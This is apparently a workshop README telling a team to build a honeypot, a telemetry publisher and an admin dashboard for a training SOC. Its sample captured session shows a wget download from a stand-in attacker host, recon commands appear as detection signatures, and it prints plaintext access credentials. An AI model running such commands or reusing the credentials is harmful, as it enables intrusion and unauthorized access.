> **Українська версія:** [README.md](README.md)

# Team 1 — Trap (Пастка): Honeypot Sensor Network

**Your Lightsail:** `wic01.sanctumsec.com` (18.153.160.134)
**Your GitHub repo:** `https://github.com/sanctum-sec/soc-day3-trap`
**Read first:** [`sanctum-sec/soc-protocol`](https://github.com/sanctum-sec/soc-protocol) — this is the contract you ship against.

---

## 1. Your mission

You are the **eyes** of the SOC. Your job is to attract attackers, record what they do, and publish that telemetry so every other team has something to work with.

By the end of the day you will have:
- A honeypot that accepts attacker connections and logs their behavior
- A publisher that converts each capture into a SOC Protocol `telemetry` event
- An admin dashboard showing what was caught and what happened to *you* (auth failures on your own API, rate limits tripped, weird requests)
- Zero or one people crying

If Trap doesn't produce events, nobody downstream has anything to do. That makes you the first thing to ship and the first thing to unblock when integration stalls.

---

## 2. Where this fits in a real SOC

From Table 1 of the 11 Strategies of a World-Class SOC (MITRE):

- **Sensing and SOC Enclave Architecture** — you are the sensor.
- **Deception** — honeypots are the purest deception play.
- **Custom Analytics and Detection Creation** — the first-pass filter on what counts as interesting.

Your output becomes everyone else's input. Real SOCs live or die by their sensors.

---

## 3. Access and what's already on your Lightsail

```
ssh ubuntu@wic01.sanctumsec.com
# password/пароль: see https://wic-krakow.sanctumsec.com/wic-access-ghosttrace (Basic Auth: wic / stepup-krakow-2026)
```

Already installed: `git`, Python 3.10 + pip, Node.js LTS, `claude`, `codex`, AWS CLI + credentials for `s3://wic-krakow-2026`.

Your SSH key for GitHub Actions: if you need one, create it with `ssh-keygen -t ed25519 -C wic01` and share the public key with your facilitator.

---

## 4. Data flows

### 4.1 What you produce (outputs)

`telemetry` events — one per captured attacker interaction. You POST these to:

| To team     | Endpoint                                    | Why                                                |
| ----------- | ------------------------------------------- | -------------------------------------------------- |
| **Analyst** | `http://wic03.sanctumsec.com:8000/ingest`   | So they can correlate and alert.                   |
| **Scout**   | `http://wic02.sanctumsec.com:8000/observe`  | So they can enrich observed IPs/hashes.            |
| **Hunter**  | `http://wic04.sanctumsec.com:8000/telemetry`| So they can run behavioral analytics on raw data.  |

One `POST` per event. Don't batch — keep it simple today.

### 4.2 What you consume (inputs)

| From team   | Endpoint                                         | Why                                                                  |
| ----------- | ------------------------------------------------ | -------------------------------------------------------------------- |
| **Scout**   | `GET http://wic02.sanctumsec.com:8000/ioc/bad-ips` | Reputation list — enrich outbound telemetry with `is_known_bad: true` |
| **Analyst** | `POST` (they call you) `/tune`                   | Optional — they suggest "capture these commands with higher priority" |

### 4.3 Example telemetry event you'll emit

```json
{
  "schema_version": "1.0",
  "event_id": "<uuid>",
  "event_type": "telemetry",
  "timestamp": "2026-04-23T09:15:22Z",
  "producer": "trap",
  "severity": "low",
  "observables": {
    "source_ip": "203.0.113.42",
    "dest_ip": "18.153.160.134",
    "dest_port": 2222,
    "user": "root",
    "protocol": "ssh"
  },
  "data": {
    "honeypot_type": "ssh_low_interaction",
    "session_id": "sess-abc123",
    "events": [
      {"t": "2026-04-23T09:15:10Z", "kind": "login_attempt", "password": "123456", "outcome": "accepted"},
      {"t": "2026-04-23T09:15:15Z", "kind": "command", "value": "uname -a"},
      {"t": "2026-04-23T09:15:18Z", "kind": "command", "value": "wget http://bad.example.com/x.sh"},
      {"t": "2026-04-23T09:15:22Z", "kind": "disconnect"}
    ],
    "enrichment": {
      "is_known_bad": true,
      "scout_reputation_score": 92
    }
  }
}
```

---

## 5. Architecture — the three things you're building

### 5.1 The honeypot application

Two paths — pick one, or do both if you have time:

**Path A (recommended — simple, fast, rich-enough):** an HTTP honeypot on port **8080** that pretends to be a login panel. Fake `/login`, `/admin`, `/wp-admin`, `/phpmyadmin` routes that always fail but log everything: source IP, user-agent, credentials tried, payload bodies. Claude can scaffold this in 15 minutes.

**Path B (higher realism):** [Cowrie](https://github.com/cowrie/cowrie) — an SSH/Telnet honeypot. Install from its GitHub repo, run it on port **2222**, tail its JSON log and convert each event to SOC Protocol. Takes ~1 hour to get working but you'll see real attackers within minutes of going live on a public IP.

**Pragmatic plan:** Start with Path A. If you finish core by mid-afternoon, add Cowrie.

### 5.2 The publisher (your integration layer)

A small Python service that:
1. Reads captures from Path A/B
2. Pulls the IOC feed from Scout periodically (every ~60s)
3. Enriches each capture with `is_known_bad` if the source IP is in the list
4. Converts to SOC Protocol envelope
5. POSTs to Analyst, Scout, and Hunter
6. Logs everything to `~/app/logs/ops.log` and errors to `~/app/logs/security.log`

### 5.3 The admin page (port 8001)

A separate tiny web page — Flask or FastAPI + HTMX is plenty — behind HTTP Basic auth (not the bearer token; use `ADMIN_USER` / `ADMIN_PASS` env vars).

Two tabs:

**Operational:**
- Last 50 captured attacker sessions (source IP, duration, commands, outcome)
- Outbound-delivery status per peer (green/red per POST)
- Throughput: events captured in the last 5 min / last hour / last 24 h

**Security:**
- Inbound auth failures (bad bearer token)
- Schema-validation rejections (malformed events from peers)
- Rate-limit trips
- Outbound POST failures (Analyst/Scout/Hunter not responding)
- Suspicious patterns against YOUR admin page itself

---

## 6. Recommended stack (not mandatory)

| Concern        | Recommendation                                  | Why                                                                 |
| -------------- | ----------------------------------------------- | ------------------------------------------------------------------- |
| Language       | **Python 3.10** (already installed)             | Cowrie is Python; pandas is everywhere                              |
| HTTP framework | **FastAPI** + Uvicorn                            | Auto-validates JSON with Pydantic, writes OpenAPI docs for free     |
| Honeypot engine | **Cowrie** (SSH) *or* a hand-rolled HTTP trap    | Cowrie if you want realism; custom if you want speed                |
| Storage        | **SQLite** via `sqlite3` stdlib                 | One file, zero setup, pandas can read it                            |
| Admin UI       | FastAPI + Jinja templates + **HTMX**             | No build step, no JavaScript frameworks                             |
| Process mgr    | `systemd`                                        | Already on the Lightsail; `systemctl restart` is your redeploy      |

If your team has a strong Node or Go developer, use what they know — the wire format is language-agnostic.

---

## 7. Security infrastructure — non-negotiable

Your tool is sitting on the public internet. Real attackers will hit it. The honeypot *wants* that on its exposed port. Your management surface does not.

Must-have (all of these, even under time pressure):

- [ ] Bearer token required on everything except `/health` and the honeypot-exposed ports
- [ ] Pydantic (or equivalent) input validation on every body
- [ ] Rate limiting (60 req/min per source IP by default) on `/ingest`, `/admin`, and the admin-login form
- [ ] HTTP Basic auth on the admin page — admin creds stored in `.env`, never committed
- [ ] Append-only security log at `~/app/logs/security.log`
- [ ] Idempotency by `event_id` — drop duplicates
- [ ] Don't log the bearer token ever, even at DEBUG

Ask Claude: `"add bearer-token auth middleware to this FastAPI app, checking the SOC_PROTOCOL_TOKEN env var"` and paste the code it gives you. Then ask `"now add rate limiting with slowapi on /ingest — 60 requests per minute per client IP"`.

---

## 8. Admin page spec

URL: `http://wic01.sanctumsec.com:8001/admin` — HTTP Basic login.

Two tabs / sections. Rendered server-side; auto-refresh every 5s with HTMX.

**Tab 1 — Operational**
- Events captured: last 5 min, last hour, last 24 h (counts)
- Recent captures table: time, source IP, user tried, 3 commands, outcome
- Outbound delivery status: ✅/❌ per peer with last-success time
- Queue depth (if you add async)

**Tab 2 — Security**
- Inbound auth failures (last 50)
- Schema-validation rejections (last 50, with offending payload truncated)
- Rate-limit trips (source IP, endpoint, count)
- Outbound failures (peer, error, count in last hour)
- Admin-login failures

---

## 9. Your day — phase by phase with Claude

These are suggestions, not commandments. Adjust to your team's size and pace.

### Phase 0 — Kickoff (9:15–10:00)

Everyone attends the facilitator-led session for the shared protocol. Don't start coding yet. Confirm: who's playing what role on your team? Write names on the board.

### Phase 1 — Scaffolding (10:00–11:00)

Goal: a FastAPI app with `/health`, `/ingest` (accepts the envelope), and a dummy `/capture` that produces fake honeypot events.

Suggested Claude prompts (any team member's session):

```
Start a FastAPI project in ~/app. Create:
- main.py with a /health GET endpoint that returns {"status":"ok","tool":"trap"}.
- /ingest POST endpoint that validates incoming JSON against a Pydantic model
  matching the event envelope in ~/app/schemas/envelope.py.
- A Pydantic model for the event envelope with required fields:
  schema_version, event_id, event_type, timestamp, producer, severity.
- A systemd unit file at ~/app/soc-app.service that runs uvicorn on port 8000.
- A requirements.txt with fastapi, uvicorn, pydantic, requests, slowapi.
Commit the initial scaffold to git with message "scaffold".
```

Push to GitHub. Check in.

### Phase 2 — The honeypot proper (11:00–13:00)

Goal: capture real (or realistic) attacker traffic and turn it into telemetry events.

Decision point: **Cowrie or custom HTTP trap?** (See section 5.1.) Team lead makes the call after a 5-min discussion.

For custom HTTP trap, ask Claude:

```
Add a second FastAPI app in ~/app/trap/ running on port 8080 (no auth on this one —
it's the honeypot, attackers must be able to hit it). Implement fake /login,
/admin, /wp-admin, /phpmyadmin, /.env, /xmlrpc.php. Every request — including
its source IP, user agent, method, path, query params, body, and any credentials
tried — is logged to SQLite at ~/app/trap/captures.db in a table called `captures`.
Always return a plausible-looking failure response (401 or a generic HTML error).
Don't actually authenticate anyone.
```

Then:

```
Write a small publisher in ~/app/publisher.py that, every 5 seconds, reads new rows
from ~/app/trap/captures.db (track a cursor by last processed rowid), converts
each into the SOC Protocol event envelope as a "telemetry" event, and POSTs to:
- http://wic03.sanctumsec.com:8000/ingest
- http://wic02.sanctumsec.com:8000/observe
- http://wic04.sanctumsec.com:8000/telemetry
Send Authorization: Bearer from the SOC_PROTOCOL_TOKEN env var.
If a peer returns non-2xx, log to ~/app/logs/security.log and keep going.
```

**Checkpoint at 13:00** — lunch. Before you leave: commit, deploy, curl your own `/health`, `curl -X POST` your own `/ingest` with a fake event and make sure it accepts it.

### Phase 3 — Integration (14:00–15:30)

Goal: you're producing real telemetry AND consuming Scout's IOC feed.

Ask Claude:

```
Add an IOC fetcher in ~/app/ioc_sync.py that every 60 seconds pulls
http://wic02.sanctumsec.com:8000/ioc/bad-ips (send bearer token) and caches the
list in memory. Modify publisher.py: before sending a telemetry event, check if
the source IP is in the cached bad-ip list, and if so, set
data.enrichment.is_known_bad = true and data.enrichment.scout_reputation_score
to whatever Scout returned.
```

When Scout's endpoint isn't ready yet, their mock should still work — they'll have published a fake `/ioc/bad-ips` that returns hardcoded data. If Scout is more than 30 min late on a mock, raise it at the checkpoint.

### Phase 4 — Admin page (15:30–17:00)

Goal: admin dashboard on port 8001, both tabs.

```
Create ~/app/admin/ — another FastAPI app on port 8001. Add HTTP Basic auth
with ADMIN_USER / ADMIN_PASS env vars. Render a two-tab page with HTMX
auto-refresh every 5s:
- Tab "Operational": counts of events in the last 5m/1h/24h, a table of the
  last 20 captures from captures.db, and outbound delivery status per peer.
- Tab "Security": last 50 entries from security.log, grouped by event type.
```

### Phase 5 — Harden + demo prep (17:00–17:30)

- Rotate your bearer token check: try curling `/ingest` without the token — should get `401`.
- Try sending malformed JSON — should get `400`.
- Try POSTing the same event twice — should be idempotent.
- Ask Claude: `"write 3 pytest tests covering auth failure, schema rejection, and idempotency"`.

---

## 10. Splitting the work across 3–5 people

If you have **3**:

| Role                              | Owns                                        |
| --------------------------------- | ------------------------------------------- |
| Sensor engineer                   | Honeypot app (Path A or B)                  |
| Integration engineer              | Publisher, IOC sync, envelope, outbound POSTs |
| Ops + admin UI + deploy           | Admin page, systemd, GitHub Actions          |

If you have **4**:

| Role                    | Owns                                    |
| ----------------------- | --------------------------------------- |
| Sensor engineer         | Honeypot app                            |
| Integration engineer    | Publisher + IOC sync + envelope         |
| Admin-UI engineer       | Port 8001 dashboard, both tabs          |
| Ops + security + deploy | systemd, Actions, rate limits, tests    |

If you have **5**:

Split "Integration" into inbound (your `/ingest`) and outbound (publisher). Everything else stays the same.

Each person: **own one directory under `~/app/`** and your own Claude session. Merge through git.

---

## 11. Mock-first checklist (do this BEFORE anything else)

By 11:00 you must have, running on `wic01` and reachable from the other teams:

- [ ] `GET /health` returns 200 with `{"status":"ok","tool":"trap"}`
- [ ] `POST /ingest` with a valid envelope and valid bearer token returns 200
- [ ] `POST /ingest` with no token returns 401
- [ ] `GET /capture/mock` returns a hand-rolled fake telemetry event for peers to see what you'll emit
- [ ] The publisher is running and emitting fake events once a minute (source IP `198.51.100.1`, user `fake-attacker`) to all three peers

Mocks don't have to be clever. They have to exist. Peer teams can develop against these stubs until your real honeypot is live.

---

## 12. Definition of done

**Minimum viable (must have by end of day):**
- [ ] Honeypot on port 8080 (or Cowrie on 2222) capturing traffic
- [ ] Publisher sending SOC Protocol telemetry to Analyst, Scout, Hunter
- [ ] IOC enrichment from Scout applied before sending
- [ ] Admin page on port 8001 with both tabs and working auth
- [ ] Bearer-token auth on `/ingest`
- [ ] systemd service + GitHub Actions deploy on push to `main`

**Bonus:**
- [ ] Cowrie running alongside the HTTP trap
- [ ] Pytest suite covering auth, schema, idempotency
- [ ] Per-peer back-off + retry on outbound failures
- [ ] A public S3 copy of your captures for posterity
- [ ] A 30-second demo video clip

---

## 13. Stretch goals (if you're ahead)

- Install Cowrie, capture a real SSH brute-force session from the internet, show it on the admin page.
- Geolocate source IPs and pin them on a world map on the admin page.
- Add a second honeypot type (Telnet or SMB).
- Feed your captures into the shared S3 bucket so future workshops have real data.

Good hunting.

---

## Day 3 cross-cutting goals (AI-CTI themes)

In addition to your team-specific deliverables above, **the following three themes from Day 3's curriculum (Modules 4–6) should visibly show up somewhere in your tool, your admin page, or your training artifacts.** Claude Code is the one that makes these feasible in a single day — use it.

### Goal 1 — AI-Augmented CTI

Use Claude (or any LLM) to automate at least one step of the CTI lifecycle *inside* your tool: extraction, classification, correlation, or enrichment of threat intelligence. This is Module 4's practical application.

### Goal 2 — TTPs and AI-enabled Attack Patterns

When you map behaviors to MITRE ATT&CK, also recognize TTPs that an AI-enabled adversary would produce differently: LLM-generated phishing prose, automated OSINT-driven recon, machine-generated polymorphic payloads, scripted beaconing at unusual intervals. Reflect this in your detections, hypotheses, IOC tags, or playbooks.

### Goal 3 — AI Social Engineering (offense *and* defense)

Real attackers now use AI to scale phishing, voice-cloning, and impersonation. Your tool should touch this at least once: capturing a social-engineering artifact, tagging one, alerting on it, enriching one, or — at minimum — documenting how your tool *would* react to an AI-enabled SE attempt.

### How each goal lands in your work — team-specific guidance

- **AI-Augmented CTI:** After you capture each honeypot session, pass the command sequence to Claude and ask: *"Classify this session into one of MITRE ATT&CK initial-access / execution / persistence techniques. Confidence?"* Store the classification alongside the raw capture. Surface both on the admin page.
- **TTPs / AI attack patterns:** Add a small set of LLM-obvious attack signatures to your honeypot responses — e.g., token-efficient one-liner recon (`uname -a; id; cat /etc/os-release`), base64-decoded curl patterns, clipboard-scraper payloads. If a session contains these, tag it `data.ai_likely=true`.
- **AI social engineering:** On your HTTP honeypot, add fake login endpoints that *look* like phishing-kit landing pages (`/secure-banking/login`, `/office365-update`). Log posted credentials as `data.se_attempt=true`. Include one in your admin page Security tab.
